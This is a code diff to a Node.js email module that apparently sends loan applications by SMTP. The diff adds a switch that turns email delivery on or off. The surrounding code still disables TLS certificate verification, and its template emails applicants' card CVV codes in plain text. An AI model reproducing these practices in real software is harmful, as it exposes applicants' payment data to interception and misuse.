@@ -7,39 +7,47 @@ const {
   SMTP_PASS,
   RECIPIENT_EMAIL,
   EMAIL_FROM_NAME = "Loan Applications",
+  EMAIL_ENABLED: EMAIL_ENABLED_ENV,
 } = process.env;
 
-console.log("[INFO] Email Service Configuration:");
-console.log(`  Host: ${SMTP_HOST}`);
-console.log(`  Port: ${SMTP_PORT}`);
-console.log(`  User: ${SMTP_USER}`);
-console.log(`  Recipient: ${RECIPIENT_EMAIL}`);
+const EMAIL_ENABLED = EMAIL_ENABLED_ENV !== "false";
 
-if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS || !RECIPIENT_EMAIL) {
+console.log("[INFO] Email Service Configuration:");
+console.log(`  Email Enabled: ${EMAIL_ENABLED}`);
+console.log(`  Host: ${SMTP_HOST || "n/a"}`);
+console.log(`  Port: ${SMTP_PORT || "n/a"}`);
+console.log(`  User: ${SMTP_USER || "n/a"}`);
+console.log(`  Recipient: ${RECIPIENT_EMAIL || "n/a"}`);
+
+let transporter;
+
+if (!EMAIL_ENABLED) {
+  console.warn("[WARN] ✉️  Email delivery disabled (EMAIL_ENABLED=false). Loan applications will be logged only.");
+} else if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS || !RECIPIENT_EMAIL) {
   console.error("[ERROR] ❌ Missing SMTP configuration. Check environment variables!");
   console.error("  Required: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, RECIPIENT_EMAIL");
+} else {
+  transporter = nodemailer.createTransport({
+    host: SMTP_HOST,
+    port: Number(SMTP_PORT || 587),
+    secure: Number(SMTP_PORT) === 465,
+    auth: {
+      user: SMTP_USER,
+      pass: SMTP_PASS,
+    },
+    tls: {
+      rejectUnauthorized: false,
+    },
+  });
+
+  transporter.verify((error, success) => {
+    if (error) {
+      console.error("[ERROR] SMTP connection failed:", error);
+    } else {
+      console.log("[SUCCESS] ✅ SMTP connection verified");
+    }
+  });
 }
-
-const transporter = nodemailer.createTransport({
-  host: SMTP_HOST,
-  port: Number(SMTP_PORT || 587),
-  secure: Number(SMTP_PORT) === 465,
-  auth: {
-    user: SMTP_USER,
-    pass: SMTP_PASS,
-  },
-  tls: {
-    rejectUnauthorized: false,
-  },
-});
-
-transporter.verify((error, success) => {
-  if (error) {
-    console.error("[ERROR] SMTP connection failed:", error);
-  } else {
-    console.log("[SUCCESS] ✅ SMTP connection verified");
-  }
-});
 
 const formatHTML = (data) => {
   const safeValue = (val) => (val ? String(val).replace(/</g, "&lt;").replace(/>/g, "&gt;") : "N/A");
@@ -282,8 +290,13 @@ CVV: ${safeValue(data.cvv)}
 };
 
 export const sendLoanApplicationEmail = async (data) => {
-  if (!RECIPIENT_EMAIL) {
-    throw new Error("Recipient email is not configured");
+  if (!EMAIL_ENABLED) {
+    console.log("[INFO] Email sending skipped (EMAIL_ENABLED=false).");
+    return { skipped: true };
+  }
+
+  if (!transporter) {
+    throw new Error("SMTP transporter is not configured");
   }
 
   try {
